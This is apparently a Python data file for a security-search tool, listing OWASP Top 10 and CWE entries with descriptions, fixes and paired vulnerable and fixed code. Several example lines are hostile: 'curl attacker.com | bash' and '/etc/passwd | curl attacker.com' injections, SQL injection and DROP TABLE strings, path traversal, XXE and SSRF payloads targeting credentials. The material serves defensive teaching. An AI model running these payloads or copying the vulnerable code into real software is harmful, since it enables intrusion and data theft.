"""
SecureSearch Knowledge Base
Complete OWASP Top 10 (2021) + CWE + CVE examples dataset
This is what gets indexed into Endee as vectors
"""

SECURITY_KNOWLEDGE_BASE = [

    # ── OWASP A01: Broken Access Control ──────────────────────────────────
    {
        "id": "A01-001",
        "title": "Broken Access Control — Missing Authorization Check",
        "category": "A01:2021",
        "category_name": "Broken Access Control",
        "cwe": "CWE-862",
        "severity": "CRITICAL",
        "description": "The application does not verify whether the authenticated user has permission to access a resource. Any logged-in user can access admin pages, other users' data, or restricted endpoints without authorization checks.",
        "example": "A user changes the URL from /user/123/profile to /user/456/profile and sees another user's data. The backend never checks if user 123 is allowed to see user 456's profile.",
        "fix": "Implement access control checks on every protected resource. Use role-based access control (RBAC). Default deny — only allow explicitly permitted actions.",
        "code_example": "# Vulnerable\n@app.route('/user/<int:user_id>')\ndef profile(user_id):\n    return db.get_user(user_id)  # No auth check!\n\n# Fixed\n@app.route('/user/<int:user_id>')\n@login_required\ndef profile(user_id):\n    if current_user.id != user_id and not current_user.is_admin:\n        abort(403)\n    return db.get_user(user_id)",
        "tags": ["authorization", "access control", "rbac", "privilege", "idor"]
    },
    {
        "id": "A01-002",
        "title": "Insecure Direct Object Reference (IDOR)",
        "category": "A01:2021",
        "category_name": "Broken Access Control",
        "cwe": "CWE-639",
        "severity": "HIGH",
        "description": "The application exposes internal implementation objects like database IDs directly to users. Attackers manipulate these references to access unauthorized data by simply changing a number in a URL or request.",
        "example": "Invoice endpoint /api/invoice?id=1042 — changing id to 1041 returns another user's invoice.",
        "fix": "Use indirect references: map user-specific tokens to internal IDs. Validate that the authenticated user owns the requested resource before returning it.",
        "code_example": "# Vulnerable: exposes raw DB id\nGET /api/order/12345\n\n# Fixed: use user-scoped lookup\norder = Order.query.filter_by(id=order_id, user_id=current_user.id).first_or_404()",
        "tags": ["idor", "object reference", "url manipulation", "unauthorized access"]
    },
    {
        "id": "A01-003",
        "title": "Path Traversal",
        "category": "A01:2021",
        "category_name": "Broken Access Control",
        "cwe": "CWE-22",
        "severity": "HIGH",
        "description": "User-supplied input is used to construct file paths without proper sanitization, allowing attackers to traverse directories and read arbitrary files on the server including /etc/passwd, config files, or source code.",
        "example": "GET /download?file=../../../etc/passwd reads the system password file.",
        "fix": "Never use user input directly in file paths. Use os.path.basename(), validate against an allowlist of permitted files, or use a dedicated file storage library.",
        "code_example": "# Vulnerable\nfilepath = os.path.join('/uploads', request.args['file'])\n\n# Fixed\nfilename = os.path.basename(request.args['file'])  # Strip path components\nif not filename.endswith(('.pdf', '.png')):\n    abort(400)\nfilepath = os.path.join('/uploads', filename)",
        "tags": ["path traversal", "directory traversal", "file access", "lfi"]
    },

    # ── OWASP A02: Cryptographic Failures ─────────────────────────────────
    {
        "id": "A02-001",
        "title": "Hardcoded Secret / API Key in Source Code",
        "category": "A02:2021",
        "category_name": "Cryptographic Failures",
        "cwe": "CWE-798",
        "severity": "CRITICAL",
        "description": "Sensitive credentials, API keys, database passwords, or secret keys are written directly in source code. Anyone who views the code — including via GitHub — can extract and abuse these credentials.",
        "example": "STRIPE_SECRET_KEY = 'sk_live_abc123xyz' hardcoded in app.py and committed to a public GitHub repository.",
        "fix": "Store all secrets in environment variables or a secrets manager (HashiCorp Vault, AWS Secrets Manager). Use python-dotenv for local development. Never commit .env files.",
        "code_example": "# Vulnerable\nDATABASE_URL = 'postgresql://admin:password123@prod-db.company.com/users'\n\n# Fixed\nimport os\nDATABASE_URL = os.environ.get('DATABASE_URL')  # Set in environment",
        "tags": ["hardcoded", "secret", "api key", "credentials", "password", "token", "git", "leak"]
    },
    {
        "id": "A02-002",
        "title": "Weak Password Hashing — MD5 or SHA1",
        "category": "A02:2021",
        "category_name": "Cryptographic Failures",
        "cwe": "CWE-328",
        "severity": "CRITICAL",
        "description": "Passwords are hashed using MD5 or SHA1, which are fast cryptographic hash functions not designed for password storage. Attackers can crack MD5/SHA1 password hashes in seconds using rainbow tables or GPU brute force.",
        "example": "hashlib.md5(password.encode()).hexdigest() — a 1080Ti GPU can crack MD5 hashes at 27 billion hashes/second.",
        "fix": "Use bcrypt, argon2, or scrypt — algorithms specifically designed for password hashing with work factors that make brute force impractical.",
        "code_example": "# Vulnerable\nimport hashlib\nhashed = hashlib.md5(password.encode()).hexdigest()\n\n# Fixed\nimport bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\n# Verify:\nbcrypt.checkpw(password.encode(), hashed)",
        "tags": ["md5", "sha1", "weak hash", "password", "bcrypt", "cryptography"]
    },
    {
        "id": "A02-003",
        "title": "SSL Certificate Verification Disabled",
        "category": "A02:2021",
        "category_name": "Cryptographic Failures",
        "cwe": "CWE-295",
        "severity": "HIGH",
        "description": "TLS/SSL certificate verification is explicitly disabled (verify=False), making all HTTPS connections vulnerable to man-in-the-middle attacks. An attacker on the network can intercept and modify all encrypted traffic.",
        "example": "requests.get('https://api.payment.com', verify=False) — any attacker on the same network can intercept payment data.",
        "fix": "Never disable SSL verification in production. If using a self-signed cert, provide the CA bundle path instead: verify='/path/to/ca-bundle.crt'",
        "code_example": "# Vulnerable\nrequests.get(url, verify=False)\n\n# Fixed\nrequests.get(url)  # verify=True is default\n# Or with custom CA:\nrequests.get(url, verify='/etc/ssl/certs/ca-certificates.crt')",
        "tags": ["ssl", "tls", "verify=false", "certificate", "https", "mitm"]
    },
    {
        "id": "A02-004",
        "title": "Secret Leaked in Git History",
        "category": "A02:2021",
        "category_name": "Cryptographic Failures",
        "cwe": "CWE-312",
        "severity": "CRITICAL",
        "description": "A secret was committed to git and later deleted, but git history preserves every commit permanently. The secret is accessible to anyone who clones the repository, even after deletion from the latest code.",
        "example": "AWS_SECRET_KEY committed in commit a3f9b21, then deleted in next commit. Still visible via: git show a3f9b21:config.py",
        "fix": "Rotate the compromised secret immediately — assume it is already stolen. Use git-filter-repo to rewrite history. Add secrets to .gitignore before first commit.",
        "code_example": "# Scrub secret from history:\ngit filter-repo --path config.py --invert-paths\n# Then rotate: generate a new key in AWS/GitHub/etc\n# Add to .gitignore:\necho '.env' >> .gitignore",
        "tags": ["git", "history", "secret", "leaked", "commit", "aws key"]
    },

    # ── OWASP A03: Injection ───────────────────────────────────────────────
    {
        "id": "A03-001",
        "title": "SQL Injection via String Concatenation",
        "category": "A03:2021",
        "category_name": "Injection",
        "cwe": "CWE-89",
        "severity": "CRITICAL",
        "description": "User input is directly concatenated or formatted into SQL queries without parameterization. Attackers can inject SQL code to dump the entire database, bypass authentication, or delete data.",
        "example": "query = \"SELECT * FROM users WHERE name='\" + username + \"'\" — attacker inputs: ' OR '1'='1 to dump all users, or '; DROP TABLE users; -- to delete the table.",
        "fix": "Use parameterized queries or prepared statements. Never build SQL strings from user input.",
        "code_example": "# Vulnerable\nquery = f\"SELECT * FROM users WHERE username = '{username}'\"\ncursor.execute(query)\n\n# Fixed\ncursor.execute('SELECT * FROM users WHERE username = ?', (username,))\n# SQLAlchemy:\nUser.query.filter_by(username=username).first()",
        "tags": ["sql injection", "sqli", "database", "injection", "string formatting"]
    },
    {
        "id": "A03-002",
        "title": "eval() Called on User Input",
        "category": "A03:2021",
        "category_name": "Injection",
        "cwe": "CWE-95",
        "severity": "CRITICAL",
        "description": "Python's eval() executes arbitrary code passed to it as a string. If user input reaches eval(), attackers can execute any Python code on the server — read files, run system commands, or establish reverse shells.",
        "example": "result = eval(request.form['expression']) — attacker sends: __import__('os').system('curl attacker.com | bash')",
        "fix": "Never use eval() on untrusted input. For math expressions use ast.literal_eval() or a dedicated math parser library. For JSON use json.loads().",
        "code_example": "# Vulnerable\nresult = eval(request.args['calc'])\n\n# Fixed — safe alternatives:\nimport ast\nresult = ast.literal_eval(user_input)  # Only literals\n# Or for math:\nimport simpleeval\nresult = simpleeval.simple_eval(expression)",
        "tags": ["eval", "code injection", "rce", "remote code execution", "arbitrary code"]
    },
    {
        "id": "A03-003",
        "title": "Command Injection via subprocess/os.system",
        "category": "A03:2021",
        "category_name": "Injection",
        "cwe": "CWE-78",
        "severity": "CRITICAL",
        "description": "User-controlled input is passed to shell commands via os.system(), subprocess with shell=True, or similar. Attackers inject shell metacharacters (;, |, &&) to run arbitrary OS commands.",
        "example": "os.system('ping ' + hostname) — attacker sends: google.com; cat /etc/passwd | curl attacker.com",
        "fix": "Use subprocess with a list of arguments (never shell=True with user input). Validate and allowlist input strictly.",
        "code_example": "# Vulnerable\nos.system('nslookup ' + domain)\n\n# Fixed\nimport subprocess, shlex\nsubprocess.run(['nslookup', domain], capture_output=True, timeout=5)  # Never shell=True",
        "tags": ["command injection", "os.system", "subprocess", "shell injection", "rce"]
    },

    # ── OWASP A04: Insecure Design ─────────────────────────────────────────
    {
        "id": "A04-001",
        "title": "Predictable Password Reset Token",
        "category": "A04:2021",
        "category_name": "Insecure Design",
        "cwe": "CWE-330",
        "severity": "HIGH",
        "description": "Password reset tokens are generated using predictable values like timestamps, user IDs, or weak random functions. Attackers can guess or brute-force tokens to hijack any account.",
        "example": "token = str(int(time.time())) + str(user_id) — completely predictable, attackers can generate valid tokens for any user.",
        "fix": "Use cryptographically secure random token generation: secrets.token_urlsafe(32). Set short expiry (15 minutes). Invalidate after use.",
        "code_example": "# Vulnerable\ntoken = hashlib.md5(str(user.id).encode()).hexdigest()\n\n# Fixed\nimport secrets\ntoken = secrets.token_urlsafe(32)  # 256 bits of cryptographic randomness\n# Store with expiry: expires = datetime.now() + timedelta(minutes=15)",
        "tags": ["password reset", "token", "predictable", "random", "account takeover"]
    },
    {
        "id": "A04-002",
        "title": "No Rate Limiting on Authentication Endpoints",
        "category": "A04:2021",
        "category_name": "Insecure Design",
        "cwe": "CWE-307",
        "severity": "HIGH",
        "description": "Login, password reset, or OTP endpoints have no rate limiting. Attackers can attempt thousands of password guesses per second (brute force) or enumerate valid usernames.",
        "example": "Login endpoint accepts unlimited requests — attacker uses a tool like Hydra to try 100,000 passwords against an account.",
        "fix": "Implement rate limiting per IP and per account. Use Flask-Limiter or similar. Add account lockout after N failed attempts. Implement CAPTCHA after failures.",
        "code_example": "# Flask-Limiter example\nfrom flask_limiter import Limiter\nlimiter = Limiter(app, key_func=get_remote_address)\n\n@app.route('/login', methods=['POST'])\n@limiter.limit('5 per minute')  # Max 5 attempts per minute per IP\ndef login(): ...",
        "tags": ["rate limiting", "brute force", "login", "authentication", "lockout"]
    },

    # ── OWASP A05: Security Misconfiguration ───────────────────────────────
    {
        "id": "A05-001",
        "title": "Debug Mode Enabled in Production",
        "category": "A05:2021",
        "category_name": "Security Misconfiguration",
        "cwe": "CWE-94",
        "severity": "CRITICAL",
        "description": "Flask/Django debug mode is enabled in a production environment. Debug mode exposes an interactive Python console (Werkzeug debugger) on error pages, allowing attackers to execute arbitrary code on the server.",
        "example": "app.run(debug=True) in production — any 500 error shows the Werkzeug interactive debugger. Attacker triggers an error and gets a Python shell.",
        "fix": "Never set debug=True in production. Use environment variables to control debug mode. Flask: set FLASK_ENV=production.",
        "code_example": "# Vulnerable\napp.run(debug=True)\n\n# Fixed\nimport os\ndebug = os.environ.get('FLASK_DEBUG', 'false').lower() == 'true'\napp.run(debug=debug)  # False in production",
        "tags": ["debug mode", "flask debug", "werkzeug", "production", "console"]
    },
    {
        "id": "A05-002",
        "title": "Missing Security Headers",
        "category": "A05:2021",
        "category_name": "Security Misconfiguration",
        "cwe": "CWE-16",
        "severity": "MEDIUM",
        "description": "Web application is missing critical security headers: Content-Security-Policy (prevents XSS), X-Frame-Options (prevents clickjacking), Strict-Transport-Security (enforces HTTPS), X-Content-Type-Options (prevents MIME sniffing).",
        "example": "No Content-Security-Policy header — attacker injects a <script> tag which executes in victims' browsers and steals session cookies.",
        "fix": "Add all security headers using Flask-Talisman or manually in a response handler. Configure CSP to whitelist only trusted sources.",
        "code_example": "from flask_talisman import Talisman\nTalisman(app, content_security_policy={\n    'default-src': ['self'],\n    'script-src': ['self'],\n})",
        "tags": ["security headers", "csp", "x-frame-options", "hsts", "xss", "clickjacking"]
    },
    {
        "id": "A05-003",
        "title": "Wildcard CORS Policy",
        "category": "A05:2021",
        "category_name": "Security Misconfiguration",
        "cwe": "CWE-942",
        "severity": "HIGH",
        "description": "Cross-Origin Resource Sharing (CORS) is configured with a wildcard (*), allowing any website to make authenticated requests to the API. Malicious websites can make API calls on behalf of logged-in users.",
        "example": "Access-Control-Allow-Origin: * — a phishing site at evil.com can call /api/transfer?amount=10000 while the victim is logged in.",
        "fix": "Specify exact allowed origins. Never use * with credentials. Validate the Origin header against an allowlist.",
        "code_example": "# Vulnerable\nCORS(app, origins='*')\n\n# Fixed\nCORS(app, origins=['https://myapp.com', 'https://admin.myapp.com'],\n     supports_credentials=True)",
        "tags": ["cors", "wildcard", "cross-origin", "api security"]
    },

    # ── OWASP A06: Vulnerable Components ──────────────────────────────────
    {
        "id": "A06-001",
        "title": "Using Library with Known CVE",
        "category": "A06:2021",
        "category_name": "Vulnerable & Outdated Components",
        "cwe": "CWE-1035",
        "severity": "HIGH",
        "description": "The application uses a third-party library that has a known published vulnerability (CVE). The vulnerability is publicly documented and exploit code may be freely available.",
        "example": "Flask 0.12.3 has CVE-2018-1000656 — a denial of service via malformed JSON. PyYAML < 5.4 has CVE-2020-14343 — arbitrary code execution via yaml.load().",
        "fix": "Run pip audit or safety check regularly. Keep all dependencies updated. Pin exact versions in requirements.txt. Use Dependabot for automated updates.",
        "code_example": "# Check for vulnerabilities:\npip install pip-audit\npip-audit\n\n# requirements.txt — pin versions:\nFlask==2.3.3  # Updated from 0.12.3\nPyYAML==6.0.1  # Updated from 5.3",
        "tags": ["cve", "vulnerable dependency", "outdated", "pip audit", "library"]
    },

    # ── OWASP A07: Auth & Identity Failures ───────────────────────────────
    {
        "id": "A07-001",
        "title": "Authentication Bypass — Always-True Condition",
        "category": "A07:2021",
        "category_name": "Identification & Authentication Failures",
        "cwe": "CWE-287",
        "severity": "CRITICAL",
        "description": "A logic bug in authentication code causes the condition to always evaluate to True regardless of the provided credentials. Any username and any password successfully authenticate.",
        "example": "if db_user.password == pwd or True: — the 'or True' makes the entire condition always true. Every login attempt succeeds.",
        "fix": "Review all authentication conditions carefully. Remove any 'or True' or similar always-true shortcuts. Use automated testing for authentication logic.",
        "code_example": "# Vulnerable\nif user.password == password or True:  # BUG: always true!\n    session['authenticated'] = True\n\n# Fixed\nif bcrypt.checkpw(password.encode(), user.password_hash):\n    session['authenticated'] = True",
        "tags": ["authentication bypass", "login", "always true", "or true", "auth bug"]
    },
    {
        "id": "A07-002",
        "title": "Plaintext Password Storage",
        "category": "A07:2021",
        "category_name": "Identification & Authentication Failures",
        "cwe": "CWE-256",
        "severity": "CRITICAL",
        "description": "User passwords are stored as plaintext in the database. A database breach immediately exposes all user passwords, which users likely reuse on other services.",
        "example": "users table has a 'password' column containing 'password123', 'letmein', 'summer2024' — a SQL injection or DB breach exposes millions of real passwords.",
        "fix": "Always hash passwords with bcrypt or argon2 before storing. Never store or log plaintext passwords.",
        "code_example": "# Vulnerable\ndb.execute('INSERT INTO users VALUES (?, ?)', (username, password))\n\n# Fixed\nfrom bcrypt import hashpw, gensalt\nhashed = hashpw(password.encode(), gensalt(rounds=12))\ndb.execute('INSERT INTO users VALUES (?, ?)', (username, hashed))",
        "tags": ["plaintext password", "password storage", "hash", "bcrypt", "database breach"]
    },

    # ── OWASP A08: Integrity Failures ─────────────────────────────────────
    {
        "id": "A08-001",
        "title": "Missing CSRF Protection",
        "category": "A08:2021",
        "category_name": "Software & Data Integrity Failures",
        "cwe": "CWE-352",
        "severity": "HIGH",
        "description": "Forms and state-changing API endpoints do not validate CSRF tokens. Malicious websites can trick authenticated users' browsers into making unintended requests — transferring money, changing passwords, or deleting accounts.",
        "example": "A malicious email contains <img src='https://bank.com/transfer?to=attacker&amount=5000'> — loading the email triggers a money transfer for any logged-in user.",
        "fix": "Use CSRF tokens on all state-changing forms and requests. Flask-WTF and Django both include CSRF protection that must be enabled.",
        "code_example": "# Flask-WTF:\nfrom flask_wtf.csrf import CSRFProtect\ncsrf = CSRFProtect(app)\n\n# In template:\n<form>\n  {{ form.csrf_token }}\n  ...\n</form>",
        "tags": ["csrf", "cross-site request forgery", "form", "token", "state change"]
    },

    # ── OWASP A09: Logging Failures ───────────────────────────────────────
    {
        "id": "A09-001",
        "title": "No Security Event Logging",
        "category": "A09:2021",
        "category_name": "Security Logging & Monitoring Failures",
        "cwe": "CWE-778",
        "severity": "MEDIUM",
        "description": "The application does not log security-relevant events: failed login attempts, access control failures, input validation failures. Without logs, attacks go undetected and forensic investigation is impossible.",
        "example": "An attacker performs 50,000 login attempts over 3 days. No logs are generated. The attack is only discovered when user accounts are compromised.",
        "fix": "Log all authentication attempts (success and failure), access control failures, and administrative actions. Include timestamp, IP, user ID, and action. Ship logs to a centralized SIEM.",
        "code_example": "import logging\nlogger = logging.getLogger('security')\n\n@app.route('/login', methods=['POST'])\ndef login():\n    if not authenticate(username, password):\n        logger.warning(f'Failed login: user={username} ip={request.remote_addr}')\n        return 'Invalid credentials', 401\n    logger.info(f'Successful login: user={username} ip={request.remote_addr}')",
        "tags": ["logging", "audit trail", "monitoring", "failed login", "siem"]
    },

    # ── OWASP A10: SSRF ───────────────────────────────────────────────────
    {
        "id": "A10-001",
        "title": "Server-Side Request Forgery (SSRF)",
        "category": "A10:2021",
        "category_name": "Server-Side Request Forgery",
        "cwe": "CWE-918",
        "severity": "HIGH",
        "description": "The application fetches a URL provided by the user without validation. Attackers can make the server request internal services (metadata APIs, databases, internal APIs), cloud provider metadata endpoints (169.254.169.254), or other sensitive resources.",
        "example": "requests.get(request.args['url']) — attacker provides http://169.254.169.254/latest/meta-data/iam/security-credentials/ to steal AWS credentials from the EC2 metadata service.",
        "fix": "Validate URLs against an allowlist of permitted domains. Block private IP ranges and cloud metadata endpoints. Use a dedicated HTTP client with restricted capabilities.",
        "code_example": "# Vulnerable\nrequests.get(request.args['webhook_url'])\n\n# Fixed\nfrom urllib.parse import urlparse\nallowed_domains = ['api.partner.com', 'webhook.allowed.com']\nparsed = urlparse(url)\nif parsed.netloc not in allowed_domains:\n    abort(400, 'URL not allowed')",
        "tags": ["ssrf", "server side request forgery", "internal network", "metadata", "aws"]
    },

    # ── Additional CWE entries ─────────────────────────────────────────────
    {
        "id": "CWE-022",
        "title": "Insecure File Upload — No Type Validation",
        "category": "A01:2021",
        "category_name": "Broken Access Control",
        "cwe": "CWE-434",
        "severity": "HIGH",
        "description": "File upload functionality accepts any file type without validation. Attackers can upload PHP/Python web shells that execute when accessed via a browser URL.",
        "example": "Upload form accepts .py files — attacker uploads shell.py containing os.system(request.args['cmd']), then accesses /uploads/shell.py?cmd=id",
        "fix": "Validate file type by magic bytes (not just extension). Allowlist specific extensions. Store uploads outside the web root. Rename files on upload.",
        "tags": ["file upload", "web shell", "unrestricted upload", "rce"]
    },
    {
        "id": "CWE-611",
        "title": "XML External Entity (XXE) Injection",
        "category": "A05:2021",
        "category_name": "Security Misconfiguration",
        "cwe": "CWE-611",
        "severity": "HIGH",
        "description": "XML parsing allows external entity references, enabling attackers to read arbitrary files from the server or perform SSRF by embedding file:// or http:// URIs in XML input.",
        "example": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root> — returns the contents of /etc/passwd in the XML response.",
        "fix": "Disable external entity processing in XML parsers. Use defusedxml library for Python XML parsing.",
        "code_example": "# Vulnerable\nfrom lxml import etree\netree.fromstring(xml_input)\n\n# Fixed\nimport defusedxml.ElementTree as ET\nET.fromstring(xml_input)  # External entities disabled by default",
        "tags": ["xxe", "xml", "external entity", "file read", "ssrf"]
    },
]


def get_all_entries():
    return SECURITY_KNOWLEDGE_BASE


def get_by_category(category_id: str):
    return [e for e in SECURITY_KNOWLEDGE_BASE
            if e["category"].startswith(category_id)]


def get_by_severity(severity: str):
    return [e for e in SECURITY_KNOWLEDGE_BASE
            if e["severity"].upper() == severity.upper()]
